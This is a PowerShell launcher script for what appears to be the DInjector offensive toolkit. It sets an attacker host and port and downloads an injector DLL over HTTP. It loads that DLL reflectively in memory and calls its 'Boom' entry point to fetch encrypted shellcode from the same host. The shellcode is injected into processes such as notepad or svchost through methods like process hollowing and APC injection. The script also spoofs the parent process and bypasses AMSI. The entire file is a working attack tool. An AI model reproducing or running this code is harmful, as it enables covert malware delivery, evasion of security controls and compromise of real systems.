<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerv2",
  "clipboardpointer",
  "currentthread",
  "remotethread",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollow"
#>
$A = "currentthread"

# lhost
$B = "10.10.13.37"

# lport
$C = 80

# injector filename
$D = "DInjector.dll"

# encrypted shellcode filename
$E = "enc"

# password to decrypt the shellcode
$F = "Passw0rd!"

# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
$G = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreadview" and "remotethreadsuspended")
$H = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing)
$I = "explorer"

# block 3rd-party DLLs ("True" / "False")
$J = "True"

# bypass AMSI ("True" / "False")
$K = "True"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadview", "remotethreadsuspended")
if ($methods.Contains($A)) {
    $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
if ($methods.Contains($A)) {
    try {
        $I = (Get-Process $I -ErrorAction Stop).Id
    }
    catch {
        $I = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /blockDlls:${J} /am51:${K}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
